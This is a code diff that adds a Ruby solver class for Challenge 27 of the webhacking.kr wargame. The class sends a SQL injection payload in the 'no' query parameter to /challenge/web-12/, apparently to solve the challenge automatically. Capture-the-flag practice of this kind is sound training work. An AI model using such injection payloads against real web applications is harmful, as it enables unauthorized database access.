@@ -653,6 +653,22 @@ module WebhackingKR
   end
 
   ##
+  # Challenge 27
+  class Challenge27 < ChallengeBase
+    CHALLENGE = 27
+
+    PATH = '/challenge/web-12/'
+    PARAM_NO = 'no'
+    PAYLOAD = "2)OR`no`>'1'--\t"
+
+    def exec
+      query = URI.encode_www_form(PARAM_NO => PAYLOAD)
+      response = get("#{PATH}?#{query}")
+      check(response.body)
+    end
+  end
+
+  ##
   # Challenge 32
   class Challenge32 < ChallengeBase
     CHALLENGE = 32
